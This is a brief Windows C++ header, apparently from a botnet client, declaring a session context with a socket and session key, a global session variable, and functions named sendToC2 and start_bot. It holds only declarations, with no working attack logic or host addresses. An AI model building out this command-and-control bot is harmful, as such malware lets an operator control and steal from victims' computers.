#pragma once

#include <winsock2.h>
#include <windows.h>

struct SessionContext {
    SOCKET hSocket;
    BYTE   sessionKey[32];
    bool   active;
};

//Global context variable
extern SessionContext g_Session;

void sendToC2(const char* text);
void start_bot();
